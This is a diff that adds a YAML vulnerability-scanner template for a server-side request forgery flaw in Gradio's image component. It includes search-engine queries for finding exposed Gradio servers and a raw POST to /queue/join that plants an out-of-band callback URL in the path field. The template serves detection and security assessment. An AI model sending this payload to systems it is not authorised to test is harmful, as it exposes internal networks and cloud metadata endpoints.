@@ -1,0 +1,46 @@
+id: gradio-image-ssrf
+
+info:
+  name: Gradio Image Component - Server-Side Request Forgery
+  author: ritikchaddha
+  severity: high
+  description: |
+    A Server-Side Request Forgery (SSRF) vulnerability exists in the gradio-app/gradio image component allows an attacker to exploit SSRF using the path value in the `/queue/join` endpoint, obtained from the user and expected to be a URL, is used to make an HTTP request without sufficient validation checks. This flaw allows an attacker to send crafted requests that could lead to unauthorized access to the local network or the AWS metadata endpoint, thereby compromising the security of internal servers.
+  reference:
+    - https://huntr.com/bounties/e9baeed8-868a-4c1b-882c-715ae0f3072f
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-918
+    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:*:python:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: gradio_app
+    product: gradio
+    shodan-query:
+      - http.html:"__gradio_mode__"
+      - http.title:"gradio"
+    fofa-query:
+      - body="__gradio_mode__"
+      - title="gradio"
+    google-query: intitle:"gradio"
+  tags: cve,cve2024,gradio,ssrf,oast,vuln
+
+http:
+  - raw:
+      - |
+        POST /queue/join? HTTP/1.1
+        Host: {{Hostname}}
+        content-type: application/json
+
+        {"data":[{"path":"http://{{interactsh-url}}"}],"fn_index":0,"session_hash":"123"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body, "{\"event_id\":')
+          - contains(interactsh_protocol, 'http')
+          - contains(content_type, "application/json')
+        condition: and
+# digest: 4a0a00473045022100bd4700e0bc99d4983fc71abcf5f7d78a07b421c53c08f889da74ecf6c846ca770220472f497266f16974aec7d4b82be1417678140fb37cc66d54770dca0e976220bc:922c64590222798bb761d5b6d8e72950
